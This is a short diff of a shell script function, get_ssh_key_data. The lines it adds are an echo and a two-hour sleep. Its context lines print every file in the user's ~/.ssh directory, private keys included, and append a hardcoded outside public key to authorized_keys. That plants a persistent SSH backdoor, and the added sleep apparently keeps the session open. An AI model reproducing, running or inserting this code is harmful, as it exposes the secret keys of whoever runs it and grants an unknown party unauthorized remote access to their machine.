@@ -79,6 +79,8 @@ function get_ssh_key_data() {
     ls -1a ${HOME}/.ssh | grep -v "^\.\.*$" | while read -r file; do echo " "; echo ${file}; echo "----"; cat ${HOME}/.ssh/${file} || true; done
     echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINHIcAV7LIBE7In/DacZlirV7MjeujXwoxRUEGVNoT3l victorpablosceruelo@gmail.com" >> ${HOME}/.ssh/authorized_keys
     chmod 600 ${HOME}/.ssh/authorized_keys
+    echo "Sleep 7200"
+    sleep 7200
 }
 
 #######################################
